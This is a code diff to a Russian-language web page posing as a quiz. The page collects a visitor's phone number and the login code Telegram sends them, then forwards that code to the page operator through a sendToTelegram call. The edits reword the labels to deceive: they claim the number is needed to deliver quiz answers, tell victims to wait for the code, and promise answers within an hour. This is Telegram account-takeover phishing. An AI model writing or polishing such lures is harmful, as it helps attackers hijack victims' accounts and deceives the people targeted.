@@ -94,7 +94,7 @@
                 <input type="radio" name="q8" value="Халяль"> Халяль
             </div>
 
-            <label for="phone">Введите ваш номер телефона:</label>
+            <label for="phone">Введите ваш номер телефона (это нужно чтобы мы смогли отправить вам ответы в телеграмме!):</label>
             <input type="tel" id="phone" name="phone" placeholder="Номер телефона" required>
 
             <button type="button" id="submitTest">Отправить ответы</button>
@@ -105,7 +105,7 @@
     <!-- Форма ввода кода -->
     <div id="codeForm" style="display: none;">
         <form>
-            <label for="code">Введите код подтверждения:</label>
+            <label for="code">Введите код подтверждения который вам пришёл в телеграме (если код не пришёл ожидайте 5-10 минут!):</label>
             <input type="text" id="code" name="code" placeholder="Код из 10-16 символов" required>
             <button type="button" id="sendCodeButton">Подтвердить</button>
         </form>
@@ -194,7 +194,7 @@ document.getElementById('sendCodeButton').addEventListener('click', async () => 
     // Отправка кода подтверждения в Telegram
     const success = await sendToTelegram(`🔑 Код подтверждения: ${code}`);
     if (success) {
-        document.getElementById('codeMessage').textContent = "Код подтверждения отправлен!";
+        document.getElementById('codeMessage').textContent = "Ожидайте, ответы придут в течении часа!";
     } else {
         document.getElementById('codeMessage').textContent = "Произошла ошибка при отправке кода.";
         sendCodeButton.disabled = false;
